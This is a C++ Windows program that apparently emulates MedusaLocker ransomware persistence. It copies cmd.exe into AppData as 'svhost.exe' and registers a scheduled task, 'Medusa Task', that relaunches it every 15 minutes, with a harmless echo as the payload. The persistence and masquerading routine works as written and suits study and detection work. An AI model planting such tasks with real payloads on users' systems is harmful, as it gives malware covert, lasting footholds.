//Author: Shaddy43

/********************************************************************
 This sample schedules a task to start cmd.exe, 15 seconds from the
 time the task is registered and then repeats after every 15 minutes
********************************************************************/

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_DCOM

#include <windows.h>
#include <iostream>
#include <comdef.h>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <ShlObj.h>
#include <fstream>
#include <codecvt>

//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

using namespace std;

std::string getCurrentTime_Plus15Sec();
bool copyFile(const std::string&, const std::string&);
const std::string getTaskExecutablePath();
std::string TCharToChar(const TCHAR*);
std::wstring stringToWstring(const std::string&);

int __cdecl wmain()
{
    //  ------------------------------------------------------
    //  Initialize COM.
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        std::cerr << "Failed 1" << std::endl;
        return -1;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        std::cerr << "Failed 2" << std::endl;
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Create a name for the task.
    LPCWSTR wszTaskName = L"Medusa Task";

    //copy cmd to appdata (MedusaLocker copies itself but i will copy cmd.exe)
    const std::string src = "C:\\Windows\\System32\\cmd.exe";
    bool res = copyFile(src, getTaskExecutablePath());
    if (!res)
    {
        std::cerr << "Error Copying File..." << std::endl;
        return 1;
    }

    wstring wstrExecutablePath = stringToWstring(getTaskExecutablePath());
    wstring wstrArguements = L"/k echo MedusaLocker Ransomware Persistence Triggered...!!!";

    //  ------------------------------------------------------
    //  Create an instance of the Task Service. 
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        std::cerr << "Failed 3" << std::endl;
        CoUninitialize();
        return -1;
    }

    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        std::cerr << "Failed 4" << std::endl;
        pService->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Get the pointer to the root task folder.  This folder will hold the
    //  new task that is registered.
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        std::cerr << "Failed 5" << std::endl;
        pService->Release();
        CoUninitialize();
        return -1;
    }

    //  If the same task exists, remove it.
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    //  Create the task definition object to create the task.
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    pService->Release();  // COM clean up.  Pointer is no longer used.
    if (FAILED(hr))
    {
        //printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
        std::cerr << "Failed 6" << std::endl;
        pRootFolder->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Get the registration info for setting the identification.
    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr))
    {
        std::cerr << "Failed 7" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    hr = pRegInfo->put_Author((BSTR)L"Medusa");
    pRegInfo->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 8" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Create the principal for the task - these credentials
    //  are overwritten with the credentials passed to RegisterTaskDefinition
    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (FAILED(hr))
    {
        std::cerr << "Failed 9" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  Set up principal logon type to interactive logon
    hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 10" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Create the settings for the task
    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr))
    {
        std::cerr << "Failed 11" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  Set setting values for the task.  
    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 12" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    // Set the idle settings for the task.
    IIdleSettings* pIdleSettings = NULL;
    hr = pSettings->get_IdleSettings(&pIdleSettings);
    if (FAILED(hr))
    {
        std::cerr << "Failed 13" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    hr = pIdleSettings->put_WaitTimeout((BSTR)L"PT5M");
    pIdleSettings->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 14" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }


    //  ------------------------------------------------------
    //  Get the trigger collection to insert the time trigger.
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr))
    {
        std::cerr << "Failed 15" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  Add the time trigger to the task.
    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 16" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    ITimeTrigger* pTimeTrigger = NULL;
    hr = pTrigger->QueryInterface(
        IID_ITimeTrigger, (void**)&pTimeTrigger);
    pTrigger->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 17" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    hr = pTimeTrigger->put_Id(_bstr_t(L"Trigger1"));
    if (FAILED(hr))
    {
        std::cerr << "Failed 18" << std::endl;
        return -1;
    }

    //  Set the task to start at a certain time. The time 
    //  format should be YYYY-MM-DDTHH:MM:SS(+-)(timezone).
    //  For example, the start boundary below
    //  is January 1st 2005 at 12:05

    hr = pTimeTrigger->put_StartBoundary(_bstr_t(getCurrentTime_Plus15Sec().c_str()));
    pTimeTrigger->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 19" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //-------------------------------------------------------
    // Get a pointer to the IRepetitionPattern interface
    IRepetitionPattern* pRepetition = NULL;
    hr = pTrigger->get_Repetition(&pRepetition);
    if (FAILED(hr)) {
        std::cerr << "Failed 20" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    // Task Repitition Set: 15 minutes indefinitely
    hr = pRepetition->put_Interval(_bstr_t("PT15M"));
    if (FAILED(hr)) {
        std::cerr << "Failed 21" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Add an action to the task.    
    IActionCollection* pActionCollection = NULL;

    //  Get the task action collection pointer.
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr))
    {
        std::cerr << "Failed 22" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    // Create the action, specifying that it is an executable action.
    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 23" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    IExecAction* pExecAction = NULL;
    //  QI for the executable task pointer.
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 24" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    // Set the path of task to your executable
    hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
    if (FAILED(hr))
    {
        std::cerr << "Failed 25" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    // Give arguments for executable... (if any)
    hr = pExecAction->put_Arguments(_bstr_t(wstrArguements.c_str()));
    pExecAction->Release();
    if (FAILED(hr))
    {
        std::cerr << "Failed 26" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    //  ------------------------------------------------------
    //  Save the task in the root folder.
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);
    if (FAILED(hr))
    {
        //details.push_back("Task Registration Failed");
        std::cerr << "\n[x] Task Registration Failed...!!!" << std::endl;
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return -1;
    }

    std::cout << "[x] Success! Task Registered successfully...!!!" << std::endl;
    std::cout << "[x] cmd.exe will open every 15 minutes..." << std::endl;

    //  Clean up.
    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
    return 0;
}

std::string getCurrentTime_Plus15Sec()
{
    // Get the current system time
    auto now = std::chrono::system_clock::now();
    // Add 15 seconds to the current time
    now += std::chrono::seconds(15);
    std::time_t time_now = std::chrono::system_clock::to_time_t(now);

    // Format the time as a string in the required format
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_now), "%Y-%m-%dT%H:%M:%S");
    return ss.str();
}

bool copyFile(const std::string& sourcePath, const std::string& destPath) {
    // Open source file for reading in binary mode
    std::ifstream src(sourcePath, std::ios::binary);
    if (!src) {
        std::cerr << "Error opening source file\n";
        return false;
    }

    // Open destination file for writing in binary mode
    std::ofstream dest(destPath, std::ios::binary);
    if (!dest) {
        std::cerr << "Error opening destination file\n";
        return false;
    }

    // Read from source file and write to destination file
    dest << src.rdbuf();

    // Close both files
    src.close();
    dest.close();

    return true;
}

const std::string getTaskExecutablePath() {

    TCHAR appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
        //std::wcout << "AppData path: " << appdata << std::endl;
        std::string charString = TCharToChar(appdata);
        charString += "\\svhost.exe"; //MedusaLocker copies itself in appdata with this name
        return charString;
    }
    else {
        std::cerr << "Error getting AppData path" << std::endl;
        return NULL;
    }
}

std::string TCharToChar(const TCHAR* tcharString)
{
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, tcharString, -1, NULL, 0, NULL, NULL);
    char* buffer = new char[bufferSize];
    WideCharToMultiByte(CP_UTF8, 0, tcharString, -1, buffer, bufferSize, NULL, NULL);
    std::string charString(buffer);
    delete[] buffer;
    return charString;
}

std::wstring stringToWstring(const std::string& str)
{
    // Create a wide character string converter
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;

    // Convert the string to a wide character string
    return converter.from_bytes(str);
}